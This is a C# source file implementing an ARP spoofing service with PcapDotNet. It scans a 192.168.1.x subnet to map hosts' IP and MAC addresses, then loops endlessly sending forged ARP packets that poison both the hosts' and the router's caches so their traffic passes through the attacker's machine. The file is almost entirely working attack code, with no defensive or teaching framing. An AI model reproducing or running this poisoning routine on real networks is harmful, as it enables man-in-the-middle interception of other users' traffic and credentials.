using ArpSpoofer.DTO;
using ArpSpoofer.ServiceContracts;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ArpSpoofer.Services
{
    public class ARPSpoofingService : IARPSpoofingService
    {
        IWifiDeviceService _deviceService;
        CancellationTokenSource cancelTokenSource;
        Dictionary<string, string> _ipMacPairs;
        public event EventHandler<double> ScanTick;
        public event EventHandler<IpMacPair> NewIpMacFound;
        public bool IsScanning { get; set; }
        public bool IsPoisoning { get; set; }
        public ARPSpoofingService(IWifiDeviceService deviceService)
        {
            _deviceService = deviceService;
            cancelTokenSource = new CancellationTokenSource();
            IsScanning = false;
            IsPoisoning = false;
            _ipMacPairs = new Dictionary<string, string>();
        }

        public async void StartPoisoning()
        {
            IsPoisoning = true;
            var routerMac = _ipMacPairs.Single(x => x.Value == _deviceService.DeviceWithDescription.GatewayIpString).Key;
            if (string.IsNullOrEmpty(routerMac))
            {
                throw new KeyNotFoundException(_deviceService.DeviceWithDescription.GatewayIpString);
            }

            var communicator = _deviceService.DeviceWithDescription.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);
            MacAddress source = new MacAddress(routerMac.Replace('-', ':'));
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                //Source = source,
                //Destination = destination,
                EtherType = EthernetType.None
            };
            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4
            };
            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
            await Task.Factory.StartNew(() =>
            {
                while (true)
                {
                    if (IsPoisoning == false)
                    {
                        break;
                    }
                    foreach (var kvp in _ipMacPairs)
                    {
                        if (kvp.Value != _deviceService.DeviceWithDescription.GatewayIpString)
                        {
                            ethernetLayer.Source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
                            ethernetLayer.Destination = new MacAddress(kvp.Key.Replace('-', ':'));
                            arpLayer.Operation = ArpOperation.Request;
                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte);
                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.GatewayIpString.Split('.').Select(str => byte.Parse(str)).ToArray());
                            arpLayer.TargetHardwareAddress = Array.AsReadOnly(kvp.Key.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());

                            Packet packet = builder.Build(DateTime.Now);
                            communicator.SendPacket(packet);
                            Thread.Sleep(2000);

                            // spoof router
                            ethernetLayer.Source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
                            ethernetLayer.Destination = new MacAddress(routerMac.Replace('-', ':'));
                            arpLayer.Operation = ArpOperation.Request;
                            arpLayer.SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte);
                            arpLayer.SenderProtocolAddress = Array.AsReadOnly(kvp.Value.Split('.').Select(str => byte.Parse(str)).ToArray());
                            arpLayer.TargetHardwareAddress = Array.AsReadOnly(routerMac.Split('-').Select(str => Convert.ToByte(str, 16)).ToArray());
                            arpLayer.TargetProtocolAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.GatewayIpString.Split('.').Select(str => byte.Parse(str)).ToArray());

                            packet = builder.Build(DateTime.Now);
                            communicator.SendPacket(packet);
                            Thread.Sleep(2000);
                        }
                    }
                }
            });
            communicator.Dispose();
        }

        public void StopPoisoning()
        {
            IsPoisoning = false;
        }

        public void Scan()
        {
            if (IsScanning == false)
            {
                IsScanning = true;
                cancelTokenSource = new CancellationTokenSource();
                ListenForReplys();
                ArpAddresses();
            }
        }

        public void StopScan()
        {
            if (IsScanning == true)
            {
                cancelTokenSource.Cancel();
                IsScanning = false;
            }
        }

        private async void ArpAddresses()
        {
            _ipMacPairs.Clear();
            var communicator = _deviceService.DeviceWithDescription.Device.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000);

            MacAddress source = new MacAddress(_deviceService.DeviceWithDescription.DeviceMacString.Replace('-', ':'));
            MacAddress destination = new MacAddress("ff:ff:ff:ff:ff:ff");
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = source,
                Destination = destination,
                EtherType = EthernetType.None
            };

            var ipVals = _deviceService.DeviceWithDescription.IpV4.Split('.').Select(x => byte.Parse(x)).ToArray();

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Request,
                SenderHardwareAddress = Array.AsReadOnly(_deviceService.DeviceWithDescription.DeviceMacByte),
                SenderProtocolAddress = Array.AsReadOnly(ipVals),
                TargetHardwareAddress = Array.AsReadOnly(new byte[] { 0, 0, 0, 0, 0, 0 }),
                //TargetProtocolAddress = new byte[] { 192, 168, 1, 1 }, // 11.22.33.44.
            };

            //IpV4Layer ipv4Layer = new IpV4Layer
            //{
            //    Source = new IpV4Address(Device.IpV4),
            //    Ttl = 128
            //};

            //IcmpEchoLayer icmpLayer = new IcmpEchoLayer();

            //PacketBuilder builder = new PacketBuilder(ethernetLayer, ipv4Layer, icmpLayer);
            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);
            await Task.Factory.StartNew(() =>
            {
                for (var i = 1; ; ++i)
                {
                    if (IsScanning == false)
                    {
                        break;
                    }
                    if (i >= 256)
                    {
                        i = 1;
                    }
                    if (i == ipVals[3]) continue;
                    // Set IPv4 parameters
                    arpLayer.TargetProtocolAddress = Array.AsReadOnly(new byte[] { 192, 168, 1, (byte)i });
                    //ipv4Layer.Identification = (ushort)i;

                    //// Set ICMP parameters
                    //icmpLayer.SequenceNumber = (ushort)i;
                    //icmpLayer.Identifier = (ushort)i;

                    // Build the packet
                    Packet packet = builder.Build(DateTime.Now);
                    Thread.Sleep(200);
                    // Send down the packet
                    communicator.SendPacket(packet);
                    if (ScanTick != null)
                    {
                        ScanTick(this, (double)i / 255.0);
                    }
                }
            });
            communicator.Dispose();
        }

        private void ListenForReplys()
        {
            var communicator = _deviceService.DeviceWithDescription.Device.Open(200, PacketDeviceOpenAttributes.Promiscuous, 1000);

            using (BerkeleyPacketFilter filter = communicator.CreateFilter("arp"))
            {
                // Set the filter
                communicator.SetFilter(filter);
            }

            Task.Factory.StartNew(async () =>
            {
                Packet packet;
                PacketCommunicatorReceiveResult receiveResult;
                do
                {
                    receiveResult = await Task.Factory.StartNew<PacketCommunicatorReceiveResult>(
                        () =>
                        {
                            PacketCommunicatorReceiveResult result = communicator.ReceivePacket(out packet);
                            switch (result)
                            {
                                case PacketCommunicatorReceiveResult.Timeout:
                                    // Timeout elapsed
                                    break;
                                case PacketCommunicatorReceiveResult.Ok:
                                    if (packet.Ethernet.Arp.Operation == ArpOperation.Reply)
                                    {
                                        //_receivedPackets.Add(packet);
                                        string mac = BitConverter.ToString(packet.Ethernet.Arp.SenderHardwareAddress.ToArray());
                                        string ip = packet.Ethernet.Arp.SenderProtocolIpV4Address.ToString();
                                        if (!_ipMacPairs.ContainsKey(mac))
                                        {
                                            _ipMacPairs.Add(mac, ip);
                                            if (NewIpMacFound != null)
                                            {
                                                NewIpMacFound(this, new IpMacPair { Ip = ip, Mac = mac });
                                            }
                                        }
                                    }
                                    break;
                                case PacketCommunicatorReceiveResult.Eof:
                                    break;
                                default:
                                    throw new InvalidOperationException("The result " + result + " shoudl never be reached here");
                            }
                            return result;
                        }
                    );
                    if (cancelTokenSource.Token.IsCancellationRequested)
                    {
                        communicator.Dispose();
                        cancelTokenSource.Token.ThrowIfCancellationRequested();
                    }
                } while (receiveResult != PacketCommunicatorReceiveResult.Eof);
            }, cancelTokenSource.Token);
        }
    }
}
